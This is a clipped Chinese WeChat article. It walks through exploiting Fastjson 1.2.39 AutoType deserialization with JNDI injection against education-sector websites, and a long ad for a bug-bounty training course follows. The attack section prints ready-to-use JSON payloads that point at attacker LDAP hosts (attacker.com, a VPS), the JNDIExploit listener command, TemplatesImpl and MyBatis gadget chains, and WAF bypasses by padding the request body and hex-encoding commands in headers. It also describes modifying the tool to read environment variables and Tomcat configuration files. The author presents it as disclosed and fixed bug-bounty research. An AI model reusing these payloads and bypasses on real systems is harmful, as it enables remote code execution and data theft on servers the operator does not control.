---
title: 【微信】通杀 Edusrc通杀70rank漏洞实战高危思路和WAF绕过
source: https://mp.weixin.qq.com/s/dO1QzXuH6gE2O-NK1bOpWA
source_host: mp.weixin.qq.com
clip_date: 2026-09-21T09:42:40+08:00
trace_id: 5fdf8ab6-7154-4616-8fe1-3c70cd9db526
content_hash: b995fb07f0c78a9faf5951a75723faf3db44f2f410c39ad9ab58367a080f0335
status: synced
tags:
  - 微信
  - 漏洞分析
  - WAF绕过
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: |-
  Fastjson 1.2.39 AutoType 反序列化 + JNDI 注入通杀 Edusrc，并记录 WAF 绕过与 JNDIExploit 二开思路。
  - **入口与探测：** 首页未授权，前端 .map 泄露，JS 中拿到 CXF 接口，按接口文档构造 JSON POST 请求 `corpBillInfo`，参数名 `request`；去花括号报 JSONException 确认 Fastjson，`{"@type":"java.lang.AutoCloseable"a["test":1]` 爆出 1.2.39 AutoType，`java.net.Inet4Address` 使 dnslog 确认出网。
  - **利用链：** `{"@type":"com.sun.rowset.JdbcRowSetImpl"}` 报错差异确认 JdbcRowSetImpl、tomcat dbcp2 BasicDataSource 可用；用 JNDIExploit 监听 LDAP 53/HTTP 80，Payload 走 `ldap://<vps>/Basic/TomcatEcho`，通过 header `cmd: whoami` 回显命令。
  - **WAF 绕过：** 网络层阻断 @type 时，在请求体加大量脏数据（如两万个 a）绕过；阻断请求头 whoami 时，将 whoami → Base64 → Hex（`6432687659573170`），并二开 JNDIExploit 的 TomcatEcho 模块解码十六进制与 Base64。
  - **权限与二开：** 目标仅 LOCAL SERVICE，`cmd.exe` 报 CreateProcess error=5，改在 catch 中用 `System.getenv()` 获取环境变量；再二开工具读取 Tomcat conf 目录和 `context.xml`，证明可读配置文件与源码。
ai_summary_style: key-points
images_status:
  total: 100
  succeeded: 100
  failed_urls: []
notion_page_id: 3e275244-d011-81d0-809d-c81e86c33e6b
ioc:
  cves: []
  cwes: []
  hashes:
    - bd060519f29a48600791b3595e15feb1
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Fastjson 1.2.39 AutoType 反序列化 + JNDI 注入通杀 Edusrc，并记录 WAF 绕过与 JNDIExploit 二开思路。
> - **入口与探测：** 首页未授权，前端 .map 泄露，JS 中拿到 CXF 接口，按接口文档构造 JSON POST 请求 `corpBillInfo`，参数名 `request`；去花括号报 JSONException 确认 Fastjson，`{"@type":"java.lang.AutoCloseable"a["test":1]` 爆出 1.2.39 AutoType，`java.net.Inet4Address` 使 dnslog 确认出网。
> - **利用链：** `{"@type":"com.sun.rowset.JdbcRowSetImpl"}` 报错差异确认 JdbcRowSetImpl、tomcat dbcp2 BasicDataSource 可用；用 JNDIExploit 监听 LDAP 53/HTTP 80，Payload 走 `ldap://<vps>/Basic/TomcatEcho`，通过 header `cmd: whoami` 回显命令。
> - **WAF 绕过：** 网络层阻断 @type 时，在请求体加大量脏数据（如两万个 a）绕过；阻断请求头 whoami 时，将 whoami → Base64 → Hex（`6432687659573170`），并二开 JNDIExploit 的 TomcatEcho 模块解码十六进制与 Base64。
> - **权限与二开：** 目标仅 LOCAL SERVICE，`cmd.exe` 报 CreateProcess error=5，改在 catch 中用 `System.getenv()` 获取环境变量；再二开工具读取 Tomcat conf 目录和 `context.xml`，证明可读配置文件与源码。

**猎洞时刻** *2026年9月21日 08:00*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/34d708b406f0dce5.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9a730f5206a2911f.png)

```javascript
本公众号“猎洞时刻”旨在分享网络安全领域的相关知识，仅限于学习和研究之用。本公众号并不鼓励或支持任何非法活动。
本公众号中提供的所有内容都是基于作者的经验和知识，并仅代表作者个人的观点和意见。这些观点和意见仅供参考，不构成任何形式的承诺或保证。
本公众号不对任何人因使用或依赖本公众号提供的信息、工具或技术所造成的任何损失或伤害负责。
本公众号提供的技术和工具仅限于学习和研究之用，不得用于非法活动。任何非法活动均与本公众号的立场和政策相违背，并将依法承担法律责任。
本公众号不对使用本公众号提供的工具和技术所造成的任何直接或间接损失负责。使用者必须自行承担使用风险，同时对自己的行为负全部责任。
```

记一次Fastjson漏洞对抗的通杀

某日挖掘 edusrc 时发现一个网站非常奇怪，进入网站首页显示未授权。幸运的是前端

泄露了.map 文件：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0c309ac75f6af1e1.png)

通过分析前端 js 发现了 CXF 服务器接口地址：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e390feb09a68a9d4.png)

## 发现CXF接口构造请求

根据接口文档信息构建 post 请求 corpBillInfo，请求体是 json 类型并且参数名是 request，那么可以构造下面请求：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/205dabe795f0078b.png)

通过其他接口测试，确认后端是 spring 项目，那么探测一下后端的 json 解析库是什么，

去掉一个花括号引导报错，出现了 JSONException，说明后端是 fastjson 解析库，再次探测版

本,同时确认目标是否开启了 AutoType 机制。探测版本 payload 如下:

```perl
{"@type":"java.lang.AutoCloseable"a["test":1]
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c3442ceb83bdcd4f.png)

这里爆出了 fastjson 版本是 1.2.39，并且确认开启了 autoType 机制，进一步探测目标是否可以出网，先进行 dns 解析，payload 是

```perl
{"@type":"java.net.Inet4Address","val":"dnslog 地址"}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bb43902067ce1cc7.png)

这里 dnslog 平台成功收到解析，接下来就可以着手探测存在哪些 jar 包插件。

【核心原理】

Fastjson 通过 @type 指定反序列化类，配合可实例化的类（如 TemplatesImpl、

JdbcRowSetImpl）进行 JNDI 注入或加载恶意字节码。

【1. JNDI 注入链（常用 RCE）】

利用类: com.sun.rowset.JdbcRowSetImpl

利用方式: 指定 dataSourceName 为恶意 JNDI 地址（如 ldap://attacker.com/Evil），并

设置 autoCommit=true 触发 lookup

Payload 示例:

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

【2. 本地字节码加载链（不依赖 JNDI）】

利用类: org.apache.ibatis.datasource.jndi.JndiDataSourceFactory（需 MyBatis 依赖）

利用方式: 通过 properties 设置 JNDI 地址

Payload 示例:

```perl
{
  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
  "properties": {
    "data_source": "ldap://attacker.com:1389/Exploit"
  }
}
```

【3. TemplatesImpl 链（加载本地字节码，需开启 AutoType）】

利用类: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

利用方式: 将恶意字节码存入 \_bytecodes 字段，触发 Transformer 加载

限制: 需要能够绕过 AutoType 的黑名单（1.2.39 版本黑名单较弱，部分链仍可用）

Payload 示例:

```perl
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": [
    "恶意 Base64 字节码"
  ],
  "_name": "test",
  "_tfactory": {
  },
  "_outputProperties": {
  }
}
```

【4. 版本特定利用点（1.2.39 黑名单绕过）】

由于 1.2.39 版本的黑名单尚未完善，以下类可能可用（需实际测试）：

\- org.apache.commons.io.input.BOMInputStream（结合其他链）

\- com.mchange.v2.c3p0.JndiRefForwardingDataSource（需要 C3P0 依赖）

\- org.springframework.context.support.ClassPathXmlApplicationContext（需 Spring 依赖，

加载远程 XML 配置）

【还有其他链就不再举例】

## 探测Fastjson利用链

我们可以发送

```perl
{"@type": "com.sun.rowset.JdbcRowSetImpl"}
```

来探测利用链是否存在，如果不存在或者在黑名单里 面 ， 会爆错误，如果存在会爆反序列化类型不匹配错误。

```
JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl 
```

这里通过探测发现存在 com.sun.rowset.JdbcRowSetImpl 和 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，

并且目标出网，可以打 com.sun.rowset.JdbcRowSetImpl 远程 jndi 注入。

我这里使用的工具是 JNDIExploit-1.3-SNAPSHOT.jar，在自己的在 VPS 上运行该工具。

执行命令

```
 java -jar JNDIExploit-1.3-SNAPSHOT.jar -i <VPS 地址> -l 53 -p 80
```

（监听 LDAP53 端口和 http80 端口）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ead105dab03080f5.png)

请求 Payload 为：

```perl
{
  "@type": "cn.com.szhtkj.auvgo.dto.CorpBillInfoRequest",
  "request": {
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://<vps 地址>/Basic/TomcatEcho",
      "autoCommit": true
    }
  }
}
```

payload 这里的

```perl
ldap://<vps 地址>/Basic/TomcatEcho。ldap://<vps 地址>:53
```

就是 vps 启动监听的 53 端口，

/Basic/TomcatEcho 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义 header cmd: whoami 的方式传

递想要执行的命令。利用 Fastjson 1.2.39 的反序列化漏洞，通过双重 @type 绕过调用 JdbcRowSetImpl 触发 JNDI 注

入，连接 LDAP 服务并使用 TomcatEcho 模块，在 Tomcat 环境下实现命令执行回显，将结果直接返回到 HTTP 响应

中。该工具地址为 https://github.com/0x727/JNDIExploit 开发方解释如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2f1b4de554f55e98.png)

执行 whoami 命令：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0ee57e1c94150bc5.png)

执行 ipconfig 命令：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e8ed55bc418830ad.png)

测试结束点到为止。

上述是这个通杀漏洞中最容易的网站，该网站的可能不存在 waf 并没有任何阻拦，下面

是通杀案例中存在比较容易绕过的 waf 的网站，发送带有@type 的请求体会在网络层面阻断，

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8c926b7110a1beba.png)

如下图：

## 脏数据绕过WAF

这里可以通过添加任意参数，并包含大量脏数据绕过，payload 如下：

```perl
{
  "@type": "cn.com.szhtkj.auvgo.dto.CorpBillInfoRequest",
  "request": {
    "f": "(俩万个 a)",
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://<vps 地址>/Basic/TomcatEcho",
      "autoCommit": true
    }
  }
}
```

执行效果 whoami 如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fb6ce88913574b49.png)

除此之外通杀的大部分网站禁止进入 CXF 服务器获取接口，所以获取不到接口信息，

只能通过前端登录界面抓包：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0b726cca21bf36ea.png)

这里可以看到请求体加密了，CXF 服务器中的接口没有加密，可能是因为部署在 CXF 服

务器的接口并不是高风险操作或者敏感数据进而没有加密，接下来就是打断点分析前端加密

代码，并且编写 python 加解密函数，这里解密后的数据内容如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e2e50fa8406b5a11.png)

同样我们可以将恶意 payload 加密：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/13226f91248dbab9.png)

执行 whoami 效果如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bb966382fd2e2dba.png)

最后该通杀漏洞最困难的几个网站思路如下：

第一个网站这里发现如果请求头中存在 whoami 恶意命令，waf 服务器将从网络层面阻

断，并且将 whoami 命令单纯 base64 加密或者 unicode 加密并不能绕过如下图：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bf2f3a3505a630e4.png)

通过翻找 JNDIExploit-1.3-SNAPSHOT.jar 工具的使用说明，并没有任何绕过 waf 的模块，

这里绕过 waf 思路是先将请求头中的命令进行 base64 编码，再进行十六进制编码，请求体

示例中的 whoami → Base64 （d2hvYW1p）→ Hex（6432687659573170）从而绕过 waf，

同时 whoami (加密后 6432687659573170)JNDIExploit 工具的 TomcatEcho 模块并不能识别加

密后的执行命令，所以我们需要二开 JNDIExploit 工具，在 github 获取项目源码，修改

TomcatEcho 模块内容，获取请求头中 cmd 参数后面的命令后先将十六进制字符串解码为字

节数组，再 base64 解码为命令字符串。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/100a4b119b397695.png)

更改内容如下：

此时再次使用二开的工具就可以成功执行命令：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ca6a86a95f4c31f2.png)

第二个网站也是一样请求头中存在 whoami 恶意命令，waf 服务器将从网络层面阻断，

并且将 whoami 命令单纯 base64 加密或者 unicode 加密并不能绕过。那么我们使用二开的

wccc-JNDIExploit.jar 来进行渗透，但是又出现新的问题了，服务器权限不够，java 不能调用

cmd 执行命令，如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b4ef33d97a04ea8e.png)

这 里 报 错 内 容 是 ： Cmd decode error: java.io.IOException: Cannot run program "cmd.exe":

## 权限异常改读环境变量

CreateProcess error=5 这个错误信息表明 Java 在执行 cmd.exe 时遇到了权限问题（error=5

通常指“拒绝访问”）

这里我想了很多办法都失效了，通过不断分析 JNDIExploit 源码，突然灵光一闪，这里的报

错是在 trycatch 捕获到异常后抛出，那么我们在 catch 代码块中通过 System.getenv()获取环

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ad16686ad89fa73c.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8b9c0150f16ea035.png)

境变量。

执行效果如下：

成功获取到环境变量，账户是 LOCAL SERVICE：最低权限的服务账户

该账户通常可以

读取系统目录 可以读 C:\\Windows\\System32 等，但通常不能写

读写自己的临时目录

C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp

读写自己的配置目录

C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\ 下

监听本地端口 可以启动 Tomcat 监听 8080 等端口

所以可以读取 Web 应用源码和配置，我这里再次修改 wccc-JNDIExploit.jar 先尝试读取配置

文件，先列出 tomcat 的 conf 文件夹所有文件，项目代码如下：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6c8ffc067b70d889.png)

再次监听端口发起请求，成功获取 conf 所有文件名称：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/22ac72696aa6038b.png)

此时我们就可以读取文件，再次修改 wccc-JNDIExploit.jar，尝试读取 context.xml

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5a655bb5576c04df.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/db0c0c83e2370ca2.png)

核心代码如下：

执行效果如下：

成功读取 context.xml 配置文件，LOCAL SERVICE 还可以写入文件，太过麻烦，此时已证明危

害，不在进一步测试。

以上漏洞均已经提交并且修复，请勿尝试复现。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/53308653ce3c7407.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5b527d932334fc40.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8606ac1236eec5b9.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/36c765f0bb47ce3a.jpg)

挖洞、赏金和入职实战班

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4d5fe7dd04fc120b.gif)

NEW JOURNEY IN TECHNOLOGY

AI赋能挖洞培训

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/64c26b362af0decd.png)

网安学子应该做什么？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/79582102c146626d.gif)

现在很多学生师傅，经常问我，学生没法去护网，是不是没法进入网安行业了？其实并不是的，条条大路通罗马，现在去不了护网不一定是你的原因，也许是你没毕业，也许是你年龄太小，无法参与。

但是，如果你能在空余时间中，磨练好自己的技术能力，夯实挖洞基础，不仅能获取一些CNVD、EDU证书，更能挖掘SRC赏金和参与网安大厂实习。如果你能做到这些，所获取的成就，比单纯参加护网收益更高。

还有人经常问我，我明明自学了那么多网安技术，B站也学了很多，一两年了为什么迟迟在实战无法上手？只能去打靶场？ 那是因为你没经过系统化实战训练，你学的技术全是碎片化的，今天学漏洞，明天学python，后天学kali，靶场和实战断崖鸿沟，这样学一辈子难以入门，更有网安垃圾培训，全程只有靶场，根本就没有带学员去实战挖洞培训。

只有真正的实战挖洞能力，永远都是你在网安这个行业的核心竞争力！挖洞足够强，无论是就业大厂，还是实现SRC赏金，都是水到渠成！这些远比其他的更重要！

如果有挖洞入职培训咨询、网安考证、扩列等，欢迎加我。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/59c73f57dbd67a81.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4f7e72f6165e7f2a.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ecd78d0058f82697.png)

猎洞团队介绍

我们团队自从2023年成立以来，历经三年发展，已经在安全圈内获取超多学员的加入，并且经过培训和一对一指点解答后，成员已经遍布网络安全大厂，如长亭科技、奇安信、绿盟科技、安恒信息、360、深信服科技、启明星辰、亚信、微步等多个安全厂商，现在经常在安全厂商，同一个办公室、区域，可能就有我们多个学员，也非常感谢各位师傅们的支持，往后的课程，内容和质量只增不减！

团队学员对于一些SRC平台，如EDUSRC平台，2026年斩获团队榜单第一、2026个人榜第一，在2025斩获团队榜单第四、成员个人榜单第一，诞生多个千分Rank和证书大满贯的师傅。

在企业SRC方面，网易SRC2026年榜第一、看云SRC2026年榜第二、爱奇艺SRC2026年榜第四、麦当劳SRC2026年榜第三、国通星驿2026SRC年榜第一，等等其他多个SRC年榜前十，还有CNVD单人获取证书量摆不下展台，并且在AI时代的来临，我们也是同样推出AI自动化挖洞等AI系列课程。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/64521a588e83819c.png)

我们的上面介绍的挖洞排名下面文章有真实图文介绍：

[猎洞时刻SRC挖洞&入职培训｜近期成绩 （文末抽奖）](https://mp.weixin.qq.com/s?__biz=MzkyNTUyNTE5OA==&mid=2247490991&idx=1&sn=478c4ec5cd1d512c79492d10a93addab&scene=21#wechat_redirect)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/160ae8c08f95307e.png)

PART.01

网安大厂真的很难进入吗？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/470d7c3b18f1460d.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1f6ba9b2fa703146.png)

网安大厂，只是在网安行业是大厂，放眼全国，实际上也只是规模上千人或者勉强上万人的企业，是没法和互联网大厂企业的规模比拟的，所以说，他并没有那么高的难度，并且也不怎么卡学历，很多都是双非本科可以随便去，剩下主要看技术能力！当然，专科的也可以，比如长亭，不卡专科，只看技术。

那么剩下的就是技术能力的要求，那么现代网安大厂，需要什么技术能力？

简单就是下面几个要求：

1、对于常规实战挖洞必须非常熟练，至少Web、小程序和APP你都能渗透测试。

2、其次具有丰富的项目经验，那么项目经验从哪来的？也就是你平时参与一些护网项目、渗透项目，还有实习时候的项目都可以。

3、掌握学习前沿技术的能力，比如目前的AI非常火爆，现在很多安全企业，在面试时候，会把AI能力纳入面试要求。

4、这个就是拔尖要求了，你如果没有，也不影响你就业，你如果会，那么就是加分项，比如过硬的代码审计、Java安全、内网渗透、CTF之类的加分项。

前面三个算是必须项，第四个算是加分项，所以从此可以看出来，都是围绕着实战挖洞进行的，你只有掌握实战挖洞，才能做到去做项目、去实习和就业。

而对于以上要求，其实并不难，只要前三个能达到，基本上就没什么大问题，而这些均在我们的培训范围内，我们只做实战方面的培训，近两年，在我们猎洞团队内出来的，入职这几个安全大厂，比如长亭科技、奇安信、360、绿盟科技、安恒信息、亚信安全、启明星辰等安全公司，起码也有上百个。几乎每个安全大厂，每个地区分公司，每个安全技术部门，都有好几个学员是来自我们这里。

其次还有入职字节跳动、腾讯、智谱、快手、希音、bilibili等会联网大厂的安全部门！

口说无凭，证据呢？如下，可以左右翻转看一看，这也只是一部分成绩

（这个动图显示不全，只截取了三分之一，实际上更多offer）：

《--可以左右滑动看猎洞学员offer--》

←左右滑动查看更多→  
实际offer比这个多的多。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/713ac40ca2461a09.png)

还有师傅问我，你们这个实战培训，和我平时学的靶场有区别吗？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7a54b7f679f9ff4f.png)

01

这个我只能说，靶场永远都是靶场，他只能在零基础阶段学习辅助，一旦你想要走的更高、更远、挖赏金、就业，你挖一辈子靶场，都达不到！所以，尽早提升实战能力，是重中之重，而那些靶场，只能算是你练手零基础的工具。

如果你学的内容，还是一堆天天教学靶场，无论是基础还是进阶，全是靶场的，那么这种培训内容，充其量只能算是零基础学习，远达不到就职和挖SRC赏金要求。

什么时候学习实战比较好？

02

学习挖洞实战是越早越好，你沉淀的时间越久越好，别人大三还在打靶场，你已经就业不愁了，可以挖不少赏金可以独立生活了，剩下时间可以学更深入的网安领域。

如果你已经大三大四，面临就业，如果还想着打靶场、考证书，无实战能力就想着就业，你还是太天真的！我劝你还是仔细思考一下吧，没有一个企业会要一个没有实战能力，不能给企业带来收益的员工，他们只会招聘一个技术更强的员工来满足项目要求。

所以如果你大三大四了还不会实战，就越应该抓紧学习这方面技能，否则校招时候就会知道什么是深沉大海。

你实战越早，经验丰富，CNVD、EDU证书一大把，挖洞赏金，企业SRC排名好几个，你觉得会有企业不喜欢你这样技术好的吗？技术行业，就应该要有技术，而不是搞什么歪门邪道。

我们这边就有好几个刚上大学大一，甚至高三时候跟着我学的，大一下学期就去qax打红队实习，企业SRC年榜好几个，你觉得他们这类人，能缺少工作？以后最次保底也是个安全大厂，好的话还可以去互联网企业or甲方安全。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1de92dc0c530f6e9.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/94d570239d3e7fe5.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a76b7acac418859a.png)

PART.02

挖洞有没有成绩介绍？

01

EDUSRC&CNVD&企业SRC

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10b63b6e62d15a59.png)

下面是我们团队成员的一些荣誉总结，欢迎随时查询，我们只做真材实料的培训，助力你完成自己的就业网安大厂目标 or 副业赏金目标！

（2026年未截止，部分排名会有上下微小浮动）

EDUSRC 2026年榜团队榜第一

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9b6c056c654b62ef.png)

EDUSRC 2026年榜个人榜单第一

EDUSRC 2026年榜个人榜单第五

EDUSRC 2026年榜个人榜单第九

EDUSRC 2026年榜个人榜单第十

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/789f54aa3d3e5e58.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b2721febca82d6fc.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ef342eb02d3714db.jpg)

EDUSRC 2025年榜个人榜单第一

EDUSRC 2025年榜团队榜第四

EDUSRC 全平台团队榜第三

EDUSRC 全平台个人榜第四

EDUSRC 常态化演习个人榜单第四

蚂蚁集团SRC 2026年榜第五

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/61ac5f7ea50a289e.png)

国通星驿SRC 2026年榜第一

国通星驿SRC 2026总榜第三

网易SRC 2026年榜第一

看云SRC 2026年榜第二

法大大SRC 2026年榜第二

补天-北森云SRC 2026年榜第二

补天-人教社SRC 2026年榜第四

UCloud-SRC 2026年榜第三

UCloud-SRC 2026年榜第四

麦当劳SRC 2026年榜第三

麦当劳SRC 2026年榜第八

爱奇艺SRC 2026年榜第四

喜马拉雅SRC 2026年榜第五

喜马拉雅SRC 2026年榜第十

Soul-SRC 2026年榜第七

途虎安全SRC 2026年榜第五

途虎安全SRC 2026年榜第八

途虎安全SRC 2026年榜第十

知识星球SRC 2026年榜第七

敦煌网SRC 2026年榜第三

合合安全SRC 2026年榜第九

新东方SRC 2026年榜第九

哈罗出行SRC 2025年榜第八

唯品会SRC 2025年榜第六

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9ec5292f979b1a25.webp)

NCC国家网络空间安全云社区-产能榜第六

更多成绩具体详情图可以看这个：

[猎洞时刻SRC挖洞&入职培训｜近期成绩 （文末抽奖）](https://mp.weixin.qq.com/s?__biz=MzkyNTUyNTE5OA==&mid=2247490991&idx=1&sn=478c4ec5cd1d512c79492d10a93addab&scene=21#wechat_redirect)

EDUSRC 2026年榜团队榜第一

![bd060519f29a48600791b3595e15feb1.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1a607722b9ed1c19.webp)

2026EDUSRC个人榜，前十名，有四个是来自我们猎洞团队。

EDUSRC 2026年榜个人榜单第一

EDUSRC 2026年榜个人榜单第五

EDUSRC 2026年榜个人榜单第九

EDUSRC 2026年榜个人榜单第十

![image.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/775d2a02cafa4faf.webp) ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6eded3f6167bf199.jpg)

蚂蚁集团SRC2026年榜第五

网易SRC2026年榜第一

看云SRC2026年榜第二，单个漏洞破万元赏金。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/493f6495ae65963b.png)

法大大SRC2026年榜第二

![image.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6786308ecf3fc175.webp)

麦当劳SRC2026年榜第三

麦当劳SRC2026年榜第八

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/18ccc29077b77614.png)

爱奇艺SRC 2026年榜第四

![image.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9652aef81c95ed44.webp)

Soul SRC 2026年榜第七

![image.png](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d792ef082d8ee8c0.webp)

Ucloud SRC 2026年榜第四和第五

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e52f3a2fd447e005.png)

唯品会SRC2025年榜第六

还有其他多个企业SRC年榜前十，就不一一列举了。

以下众多学员漏洞赏金，单个漏洞赏金破万等。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ed173d8a154463cc.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8683bdf012abfcbe.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6fe9d86251bf97d6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/70041050303c6a8c.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2c1a4490a8518e66.png)

更多成绩内容欢迎加我了解！

PART.03

AI自动化渗透挖洞

01

培训内容是否包含AI自动化渗透和AI安全相关内容？

关于AI自动化挖洞，这方面我们课程也是当然包含的！我们目前猎洞培训课程第四期，一直都是持续更新与时俱进的！目前AI如此火热，我们当然也会开展相关的能力提升，祝学员们也能掌握AI能力，赋能挖洞和就业！

有想要了解的也可以看看下面的文章哦，关于AI挖洞方面的。点击下方链接即可跳转！

[AI挖洞目前已经是大势所趋](https://mp.weixin.qq.com/s?__biz=MzkyNTUyNTE5OA==&mid=2247490564&idx=1&sn=fe84fc6c251f6037fa6f67003f149055&scene=21#wechat_redirect)

也有学员通过AI挖洞，拿到单洞6000元赏金。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f9f0d2f3ade58ef2.png)

猎洞第四期挖洞入职培训介绍

01

如何联系？价格怎么样？福利有哪些？

1、我们目前第四期培训的价格为 1888¥ ，第五期价格预估涨价到两千多。

2、一次报名可以永久每期学习，报名后，之前的1～4期，包含以后的第五期、第六期等都能永久学习，不会二次收费。

3、报名包含一对一解答，包含网安的挖洞实战问题、技术问题、大厂入职规划等问题。

4、报名培训，包含直播课程、录播课程、对应详情课件、工具和赠送知识星球，内部交流技术群。

5、如果是完全零基础的学员，报名第四期，会额外赠送一套打基础课程，1～2内足够完成零基础阶段，剩下直接学第四期实战，可以的短期内挖到自己第一个实战漏洞。

6、对于网安方面的考证，如CISP、NISP、PTE均有超低内部价格。

报名如何联系？扫码加我微信，备注“培训”即可，我来给你详情解答！可以找我了解更多我们的学员成绩！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4ca79de5c379a095.png)

下面就是贴一下第四期实战课程课表和赠送的零基础课程课表。

